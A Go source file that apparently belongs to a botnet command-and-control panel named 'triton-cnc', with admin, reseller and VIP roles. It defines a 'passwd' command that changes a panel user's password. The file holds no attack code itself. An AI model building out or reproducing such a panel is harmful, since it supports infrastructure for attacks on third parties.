package extra_Command

import (
	"triton-cnc/core/mysql"
	"triton-cnc/core/sessions/sessions"
	"triton-cnc/core/models/util"

	"golang.org/x/term"
)


func init() {

	Register(&Command{
		Name: "passwd",

		Description: "Changes your password",

		Admin: false,
		Reseller: false,
		Vip: false,

		Execute: func(Session *sessions.Session_Store, cmd []string) error {

			passwordbef := term.NewTerminal(Session.Channel, "\x1b[0mNew Password>\x1b[38;5;16m")

			PasswordOne, error := passwordbef.ReadLine()
			if error != nil {
				return error
			}

			passwordtwobef := term.NewTerminal(Session.Channel, "\x1b[0mComfirm New Password>\x1b[38;5;16m")

			PasswordTwo, error := passwordtwobef.ReadLine()
			if error != nil {
				return error
			}

			if PasswordOne != PasswordTwo {
				Session.Channel.Write([]byte("\x1b[0mPasswords do not match!\r\n"))
				return nil
			}

			done := database.EditFeild(Session.User.Username, "password", util.HashPassword(PasswordTwo))
			if !done {
				Session.Channel.Write([]byte("\x1b[0mfailed to update password correctly!\r\n"))
				return nil
			} else {
				Session.Channel.Write([]byte("\x1b[0mPassword was correctly updated!\r\n"))
				return nil
			}

		},
	})
}